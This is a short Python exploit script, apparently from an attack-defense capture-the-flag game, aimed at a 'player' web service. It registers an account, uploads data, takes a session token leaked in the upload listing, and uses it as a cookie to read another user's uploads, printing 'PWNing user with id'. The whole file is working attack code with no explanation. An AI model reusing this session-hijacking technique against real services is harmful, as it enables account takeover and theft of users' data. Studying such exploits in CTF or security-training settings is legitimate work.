#!/usr/bin/env python3

import requests
from pwn import *

from player_lib import *

host = sys.argv[1]

mch = CheckMachine(host)
u, p = mch.register_user()
sess = mch.login_user(u, p)

mch.upload_frames(sess, 'pwn', [b'\x00' * 8])
data = mch.get_my_uploads(sess)[0]
uid = data['id']

print('PWNing user with id', uid)

print('His uploads:')

r = requests.get(f'{mch.url}/player/my_uploads/', cookies={'session': data['token']})
print(r.text)
